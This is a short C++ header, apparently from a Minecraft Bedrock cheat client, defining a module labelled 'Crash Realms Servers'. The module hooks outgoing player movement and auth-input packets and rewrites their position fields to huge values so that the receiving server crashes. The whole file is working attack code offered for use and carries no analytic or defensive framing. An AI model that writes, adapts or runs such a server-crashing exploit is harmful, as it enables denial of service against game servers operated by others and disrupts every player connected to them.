#pragma once
#include "Module.h"
class Crasher : public IModule {
public:
	Crasher() : IModule(0, Category::WORLD, "Crash Realms Servers") {}
	~Crasher(){};

	// Inherited via IModule
	virtual const char* getModuleName() override { return ("Crasher"); }
	virtual void onSendPacket(C_Packet* packet) override {
		if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
			PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
			InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
			InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
			InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
		} else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
			C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
			movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
			movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
		}
	}
	virtual void onEnable() override {
		if (g_Data.getLocalPlayer() == nullptr)
			setEnabled(false);
	}
	virtual void onTick(C_GameMode* gm) override {
		if (g_Data.getLocalPlayer() == nullptr)
			setEnabled(false);
	}
};